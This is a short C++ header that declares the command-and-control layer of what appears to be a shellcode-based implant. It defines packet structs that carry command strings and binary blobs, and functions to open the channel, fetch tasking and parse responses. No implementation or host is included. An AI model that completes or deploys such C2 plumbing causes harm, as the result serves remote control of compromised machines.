#pragma once

#include "shellcode.hpp"

#pragma pack(push,1)
typedef struct {
    uint32_t id;            // instruction identifier
    uint32_t argLength;     // arg length
    uint32_t contentLength; // content length
} packet_header;
#pragma pack(pop)

typedef struct  {
    uint32_t id;            // instruction identifier
    uint32_t argLength;     // arg length
    uint32_t contentLength; // content length
    char* args;             // optional: cmd string
    char* content;          // optional: binary blob
} c2_packet;

namespace Comms {

    DWORD initialize(sh_context* ctx, DWORD secure);

    DWORD getRequest(sh_context* ctx, module_context_t* m_ctx);

    DWORD readResponse(sh_context* ctx, char** response, DWORD* totalSize);

    DWORD teardown(sh_context* ctx);

    DWORD parseResponse(sh_context* ctx, char* responseData, size_t bufferSize, c2_packet* pkt);
}
